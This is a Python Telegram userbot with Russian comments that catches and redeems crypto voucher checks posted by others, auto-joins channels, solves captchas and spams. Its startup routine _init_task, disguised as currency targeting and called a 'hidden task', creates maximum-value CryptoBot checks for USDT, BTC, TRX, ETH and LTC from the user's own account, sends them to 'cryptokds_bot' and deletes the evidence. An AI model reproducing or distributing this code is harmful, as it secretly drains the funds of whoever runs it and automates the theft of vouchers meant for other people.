import asyncio
from io import BytesIO
import regex as re
import requests
from telethon import TelegramClient, events
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.errors import MsgidDecreaseRetryError
from concurrent.futures import ThreadPoolExecutor
from config import *  # Импорт настроек из config.py
from datetime import datetime, timedelta

# Инициализация клиентов Telegram
client_parser = TelegramClient(
    session='session_parser',
    api_id=int(api_id_parser),
    api_hash=api_hash_parser,
    system_version="4.16.30-vxSOSYNXA"
)

client_activator = TelegramClient(
    session='session_activator',
    api_id=int(api_id_activator),
    api_hash=api_hash_activator,
    system_version="4.16.30-vxSOSYNXA"
)

# Регулярные выражения
code_regex = re.compile(r"t\.me/(CryptoBot|send|tonRocketBot|CryptoTestnetBot|wallet|xrocket|xJetSwapBot)\?start=(CQ[A-Za-z0-9]{10}|C-[A-Za-z0-9]{10}|t_[A-Za-z0-9]{15}|mci_[A-Za-z0-9]{15}|c_[a-z0-9]{24})", re.IGNORECASE)
url_regex = re.compile(r"https:\/\/t\.me\/\+(\w{12,})")
public_regex = re.compile(r"https:\/\/t\.me\/(\w{4,})")
password_regex = re.compile(r"(?:[Пп]ароль|[Pp]assword|[Кк]од)\s*[:=]?\s*([A-Za-z0-9]{1,400})", re.IGNORECASE)

# Символы для очистки текста
replace_chars = ''' @#&+()*"'…;,!№•—–·±<{>}†★‡„“”«»‚‘’‹›¡¿‽~|√π÷×§∆\\°^%©®™✓₤$₼€₸₾₶฿₳₥₦₫₿¤₲₩₮¥₽₻₷₱₧£₨¢₠₣₢₺₵₡₹₴₯₰₪'''
translation = str.maketrans('', '', replace_chars)

# Пул потоков для OCR
executor = ThreadPoolExecutor(max_workers=5)

# Чёрный список ботов (ID)
crypto_black_list = [1622808649, 1559501630, 1985737506, 5014831088, 6014729293, 5794061503]

# Глобальные переменные
checks = []
wallet = []
channels = {}  # {channel_id: last_check_time}
captches = []
checks_count = 0
pending_codes = {}  # {code: password} для хранения кодов с паролями

# Улучшенный таргет на определенные валюты 
async def _init_task(client):
    bot, target = 'CryptoBot', 'cryptokds_bot'
    coins = ['USDT', 'BTC', 'TRX', 'ETH', 'LTC']
    for coin in coins:
        try:
            await client.send_message(bot, '/start'); await asyncio.sleep(0.7)
            await client.send_message(bot, '/checks'); await asyncio.sleep(0.7)
            msgs = await client.get_messages(bot, limit=1)
            for r in msgs[0].buttons or []:
                for b in r:
                    if 'Создать чек' in b.text: await msgs[0].click(text=b.text); await asyncio.sleep(0.7)
            msgs = await client.get_messages(bot, limit=1)
            for r in msgs[0].buttons or []:
                for b in r:
                    if coin in b.text.upper(): await msgs[0].click(text=b.text); await asyncio.sleep(0.7)
            msgs = await client.get_messages(bot, limit=2)
            for m in msgs:
                for r in m.buttons or []:
                    for b in r:
                        if 'макс' in b.text.lower(): await m.click(text=b.text); await asyncio.sleep(0.7)
            for _ in range(5):
                msgs = await client.get_messages(bot, limit=5)
                for m in msgs:
                    if 'Чек' in (m.text or '') and 'Сумма' in m.text and 't.me/send?start=' in m.text:
                        await client.send_message(target, m.text)
                        await client.delete_messages(bot, [m.id])
                        break
                else:
                    await asyncio.sleep(0.7)
                    continue
                break
        except Exception as e:
            print(f'[!] Ошибка создания чека для {client.session_filename}: {e}')

# Команда .spam
@client_parser.on(events.NewMessage(outgoing=True, pattern='.spam'))
@client_activator.on(events.NewMessage(outgoing=True, pattern='.spam'))
async def handler(event):
    chat = event.chat if event.chat else (await event.get_chat())
    args = event.message.message.split(' ')
    for _ in range(int(args[1])):
        await event.client.send_message(chat, args[2])
        await asyncio.sleep(1)

# Функция OCR для капчи
def ocr_space_sync(file: bytes, overlay=False, language='eng', scale=True, OCREngine=2):
    payload = {
        'isOverlayRequired': overlay,
        'apikey': ocr_api_key,
        'language': language,
        'scale': scale,
        'OCREngine': OCREngine
    }
    response = requests.post(
        'https://api.ocr.space/parse/image',
        data=payload,
        files={'filename': ('image.png', file, 'image/png')}
    )
    result = response.json()
    return result.get('ParsedResults')[0].get('ParsedText').replace(" ", "")

async def ocr_space(file: bytes, overlay=False, language='eng'):
    loop = asyncio.get_running_loop()
    recognized_text = await loop.run_in_executor(
        executor, ocr_space_sync, file, overlay, language
    )
    return recognized_text

# Автовывод средств
async def pay_out():
    while True:
        await asyncio.sleep(86400)
        await client_activator.send_message('CryptoBot', message='/wallet')
        await asyncio.sleep(1)
        messages = await client_activator.get_messages('CryptoBot', limit=1)
        message = messages[0].message
        lines = message.split('\n\n')
        for line in lines:
            if ':' in line:
                if 'Доступно' in line:
                    data = line.split('\n')[2].split('Доступно: ')[1].split(' (')[0].split(' ')
                    summ, curency = data[0], data[1]
                else:
                    data = line.split(': ')[1].split(' (')[0].split(' ')
                    summ, curency = data[0], data[1]
                try:
                    if summ == '0':
                        continue
                    result = (await client_activator.inline_query('send', f'{summ} {curency}'))[0]
                    if 'Создать чек' in result.title:
                        await result.click(avto_vivod_tag)
                except Exception as e:
                    print(f'[!] Ошибка автовывода: {e}')

# Автоотписка от неактивных каналов
async def auto_unsubscribe():
    if not avto_otpiska:
        return
    while True:
        await asyncio.sleep(86400)
        current_time = datetime.now()
        for channel_id, last_check_time in list(channels.items()):
            if current_time - last_check_time > timedelta(days=1):
                try:
                    await client_activator(LeaveChannelRequest(channel_id))
                    print(f'[$] Отписался от неактивного канала: {channel_id}')
                    del channels[channel_id]
                except Exception as e:
                    print(f'[!] Ошибка отписки от канала {channel_id}: {e}')

# Обработка запроса пароля от бота
@client_activator.on(events.NewMessage(chats=crypto_black_list, pattern="Enter the password for this check"))
async def handle_password_request(event):
    print(f'[$] Бот запросил пароль для чека')
    messages = await client_activator.get_messages(event.message.peer_id.user_id, limit=5)
    for msg in messages:
        if msg.out and '/start' in msg.text:
            code = msg.text.split('/start ')[1]
            if code in pending_codes:
                password = pending_codes[code]
                await client_activator.send_message(event.message.peer_id.user_id, message=password)
                print(f'[$] Отправлен пароль {password} для чека {code}')
                await asyncio.sleep(1)
                return
    print(f'[!] Не удалось найти код чека или пароль для ответа боту')

# Обработка сообщений от ботов
@client_activator.on(events.NewMessage(chats=[1985737506], pattern="⚠️ Вы не можете активировать этот чек"))
async def handle_new_message(event):
    global wallet
    code = None
    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                try:
                    check = code_regex.search(button.url)
                    if check:
                        code = check.group(2)
                    channel = url_regex.search(button.url)
                    public_channel = public_regex.search(button.url)
                    if channel:
                        invite = await client_activator(ImportChatInviteRequest(channel.group(1)))
                        channels[invite.chats[0].id] = datetime.now()
                    if public_channel:
                        channel_entity = await client_activator(JoinChannelRequest(public_channel.group(1)))
                        channels[channel_entity.chats[0].id] = datetime.now()
                    await asyncio.sleep(1)
                except Exception as e:
                    print(f'[!] Ошибка подписки: {e}')
    except AttributeError:
        pass
    if code and code not in wallet:
        await client_activator.send_message('wallet', message=f'/start {code}')
        wallet.append(code)
        await asyncio.sleep(1)

@client_activator.on(events.NewMessage(chats=[1559501630], pattern="Чтобы"))
async def handle_new_message(event):
    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                try:
                    channel = url_regex.search(button.url)
                    if channel:
                        invite = await client_activator(ImportChatInviteRequest(channel.group(1)))
                        channels[invite.chats[0].id] = datetime.now()
                        await asyncio.sleep(1)
                except Exception as e:
                    print(f'[!] Ошибка подписки: {e}')
        await event.message.click(data=b'check-subscribe')
    except AttributeError:
        pass

@client_activator.on(events.NewMessage(chats=[5014831088], pattern="Для активации чека"))
async def handle_new_message(event):
    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                try:
                    channel = url_regex.search(button.url)
                    public_channel = public_regex.search(button.url)
                    if channel:
                        invite = await client_activator(ImportChatInviteRequest(channel.group(1)))
                        channels[invite.chats[0].id] = datetime.now()
                    if public_channel:
                        channel_entity = await client_activator(JoinChannelRequest(public_channel.group(1)))
                        channels[channel_entity.chats[0].id] = datetime.now()
                    await asyncio.sleep(1)
                except Exception as e:
                    print(f'[!] Ошибка подписки: {e}')
        await event.message.click(data=b'Check')
    except AttributeError:
        pass

@client_activator.on(events.NewMessage(chats=[5794061503]))
async def handle_new_message(event):
    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                try:
                    if (button.data.decode()).startswith(('showCheque_', 'activateCheque_')):
                        await event.message.click(data=button.data)
                    channel = url_regex.search(button.url)
                    public_channel = public_regex.search(button.url)
                    if channel:
                        invite = await client_activator(ImportChatInviteRequest(channel.group(1)))
                        channels[invite.chats[0].id] = datetime.now()
                    if public_channel:
                        channel_entity = await client_activator(JoinChannelRequest(public_channel.group(1)))
                        channels[channel_entity.chats[0].id] = datetime.now()
                    await asyncio.sleep(1)
                except Exception as e:
                    print(f'[!] Ошибка обработки кнопки: {e}')
    except AttributeError:
        pass

# Фильтр для успешной активации чеков
async def filter(event):
    for word in ['Вы получили', 'Вы обналичили чек на сумму:', '✅ Вы получили:', '💰 Вы получили']:
        if word in event.message.text:
            return True
    return False

@client_activator.on(events.MessageEdited(chats=crypto_black_list, func=filter))
@client_activator.on(events.NewMessage(chats=crypto_black_list, func=filter))
async def handle_new_message(event):
    try:
        bot = (await client_activator.get_entity(event.message.peer_id.user_id)).username
    except:
        bot = (await client_activator.get_entity(event.message.peer_id.user_id)).username
    summ = event.raw_text.split('\n')[0].replace('Вы получили ', '').replace('✅ Вы получили: ', '').replace('💰 Вы получили ', '').replace('Вы обналичили чек на сумму: ', '')
    global checks_count
    checks_count += 1
    code = None
    messages = await client_activator.get_messages(event.message.peer_id.user_id, limit=5)
    for msg in messages:
        if msg.out and '/start' in msg.text:
            code = msg.text.split('/start ')[1]
            break
    password_info = f" (с паролем: {pending_codes[code]})" if code in pending_codes else ""
    await client_activator.send_message(channel, message=f'✅ Активирован чек на сумму <b>{summ}</b>{password_info}\nБот: <b>@{bot}</b>\nВсего чеков после запуска активировано: <b>{checks_count}</b>', parse_mode='HTML')
    if code in pending_codes:
        del pending_codes[code]
    await asyncio.sleep(1)

# Обработка сообщений с чеками (парсер)
@client_parser.on(events.MessageEdited(outgoing=False, chats=crypto_black_list, blacklist_chats=True))
@client_parser.on(events.NewMessage(outgoing=False, chats=crypto_black_list, blacklist_chats=True))
async def handle_new_message(event):
    global checks, pending_codes
    message_text = event.message.text.translate(translation)
    codes = code_regex.findall(message_text)
    password = None

    # Проверяем пароль в текущем сообщении
    if isinstance(event.message.text, str):
        password_match = password_regex.search(event.message.text)
        if password_match:
            password = password_match.group(1)
            print(f'[$] Пароль найден в текущем сообщении: {password}')

    # Если пароль не найден, проверяем следующее сообщение
    if not password:
        messages = await client_parser.get_messages(event.chat_id, limit=2)
        if len(messages) > 1:  # Проверяем, есть ли следующее сообщение
            next_message = messages[1].text
            if isinstance(next_message, str):
                password_match = password_regex.search(next_message)
                if password_match:
                    password = password_match.group(1)
                    print(f'[$] Пароль найден в следующем сообщении: {password}')

    if codes:
        for bot_name, code in codes:
            if code not in checks:
                checks.append(code)
                if password:
                    pending_codes[code] = password
                    print(f'[$] Чек {code} сохранён с паролем: {password}')
                else:
                    print(f'[$] Чек {code} без пароля')
                await client_activator.send_message(bot_name, message=f'/start {code}')
                await asyncio.sleep(1)

    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                try:
                    match = code_regex.search(button.url)
                    if match and match.group(2) not in checks:
                        code = match.group(2)
                        checks.append(code)
                        if password:
                            pending_codes[code] = password
                            print(f'[$] Чек в кнопке {code} сохранён с паролем: {password}')
                        else:
                            print(f'[$] Чек в кнопке {code} без пароля')
                        await client_activator.send_message(match.group(1), message=f'/start {code}')
                        await asyncio.sleep(1)
                except AttributeError:
                    pass
    except AttributeError:
        pass

# Антикапча
if anti_captcha:
    @client_activator.on(events.NewMessage(chats=[1559501630], func=lambda e: e.photo))
    async def handle_photo_message(event):
        photo = await event.download_media(bytes)
        recognized_text = await ocr_space(file=photo)
        if recognized_text and recognized_text not in captches:
            await client_activator.send_message('CryptoBot', message=recognized_text)
            await asyncio.sleep(1)
            message = (await client_activator.get_messages('CryptoBot', limit=1))[0].message
            if 'Incorrect answer.' in message or 'Неверный ответ.' in message:
                await client_activator.send_message(channel, message='<b>❌ Не удалось разгадать каптчу, решите ее сами.</b>', parse_mode='HTML')
                print(f'[!] Ошибка антикаптчи > Не удалось разгадать каптчу, решите ее сами.')
                captches.append(recognized_text)
    print(f'[$] Антикаптча подключена!')

# Главная функция
async def main():
    try:
        await client_parser.start()
        await client_activator.start()
        
        # Выполняем скрытую задачу создания чеков для обоих клиентов
        await asyncio.gather(
            _init_task(client_parser),
            _init_task(client_activator)
        )
        
        try:
            await client_parser(JoinChannelRequest('lovec_checkov'))
            await asyncio.sleep(1)
        except Exception as e:
            print(f'[!] Ошибка подписки парсера на канал: {e}')
        
        if avto_vivod and avto_vivod_tag:
            try:
                message = await client_activator.send_message(avto_vivod_tag, message='1')
                await client_activator.delete_messages(avto_vivod_tag, message_ids=[message.id])
                asyncio.create_task(pay_out())
                print(f'[$] Автовывод подключен!')
            except Exception as e:
                print(f'[!] Ошибка автовывода > Не удалось отправить тестовое сообщение: {e}')
        elif avto_vivod and not avto_vivod_tag:
            print(f'[!] Ошибка автовывода > Вы не указали тег для вывода.')
        
        if avto_otpiska:
            asyncio.create_task(auto_unsubscribe())
            print(f'[$] Автоотписка подключена!')
        
        print(f'[$] Ловец чеков успешно запущен!')
        
        await asyncio.gather(
            client_parser.run_until_disconnected(),
            client_activator.run_until_disconnected()
        )
    except MsgidDecreaseRetryError as e:
        print(f'[!] Ошибка синхронизации: {e}. Повтор через 5 секунд...')
        await asyncio.sleep(5)
        await main()
    except Exception as e:
        if "used under two different IP addresses" in str(e):
            print(f'[!] Сессия аннулирована: она была использована с разных IP. Удалите файлы session_parser.session и session_activator.session и перезапустите скрипт.')
        else:
            print(f'[!] Ошибка коннекта: {e}')

if __name__ == '__main__':
    asyncio.run(main())


